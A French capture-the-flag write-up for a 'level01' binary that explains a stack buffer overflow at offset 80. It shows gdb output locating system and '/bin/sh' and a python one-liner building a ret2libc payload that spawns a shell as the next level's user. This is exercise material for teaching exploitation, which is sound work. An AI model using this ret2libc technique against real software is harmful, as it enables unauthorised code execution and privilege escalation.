# Level 01

Le programme de se niveau est presque semblable au niveau précedent, sauf que cette fois même si le binaire n'aboutira jamais car qu'elle que soit le mot de passe que nous rentrerons nous aurons `nope, incorrect password...`.

Le binaire demande sur STDIN un utilisateur et lance la fonction `verify_user_name` ou il fait un `strncmp` de la chaine récupérer sur STDIN avec `dat_wil`. Si l'utilisateur est égale à `dat_wil`, le programme nous demanderas un password et executeras la fonction `verify_user_pass` feras un `strncmp` de la chaine de charactère avec `admin` mais dans tous les cas le programme s'arreteras et ecriras sur STDOUT `nope, incorrect password...`.

Mais l'or du deuxième `fgets` il est possible de réecrire EIP avec un offest de 80, nous pouvons alors l'exploité avec un `ret2libc`.

Nous devons alors retrouver l'adresse de la fonction `system` et de l'adresse de la string `/bin/sh`. 

```shell
~ gdb level01
(gdb) r
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....
Enter Password:
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz
nope, incorrect password...

Program received signal SIGSEGV, Segmentation fault.
0x55555555 in ?? ()
(gdb) shell echo -n "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUU" | wc -c
84
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) find __libc_start_main,+99999999,"/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.
(gdb) quit
~ python -c 'print "dat_wil\n" + "B"*80 + "\xd0\xae\xe6\xf7" + "OSEF" + "\xec\x97\xf8\xf7"' > /tmp/pattern
~ cat /tmp/pattern - | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

whoami
level02
```

